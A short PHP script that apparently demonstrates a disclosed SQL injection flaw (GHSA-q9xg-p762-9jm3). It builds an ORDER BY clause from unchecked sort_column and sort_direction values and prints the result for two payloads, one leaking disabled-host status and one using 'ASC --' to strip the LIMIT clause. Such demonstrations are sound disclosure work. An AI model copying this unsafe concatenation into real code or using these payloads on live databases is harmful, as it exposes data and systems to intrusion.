<?php
// Simplified demonstration of GHSA-q9xg-p762-9jm3

function demonstrate_vulnerability($sort_column, $sort_direction, $rows, $page) {
    $rows_query = "SELECT * FROM host AS h LEFT JOIN host_template AS ht ON h.host_template_id=ht.id WHERE 1=1";

    $sortby = $sort_column;
    if ($sortby == 'h.hostname') {
        $sortby = 'INET_ATON(h.hostname)';
    }

    $sql_query = "$rows_query ORDER BY $sortby " .
        $sort_direction . ' LIMIT ' .
        ($rows*($page-1)) . ',' . $rows;

    echo "GENERATED SQL: $sql_query\n";
}

$rows = 30;
$page = 1;

echo "Demonstrating SQL Injection via sort_column / sort_direction...\n";

// Case 2a - Leak disabled host status
echo "\nCase 2a: Leak disabled host status\n";
demonstrate_vulnerability("h.disabled", "ASC", $rows, $page);

// Case 2d - Remove LIMIT via sort_direction comment injection
echo "\nCase 2d: Remove LIMIT via sort_direction comment injection\n";
demonstrate_vulnerability("h.description", "ASC --", $rows, $page);

?>
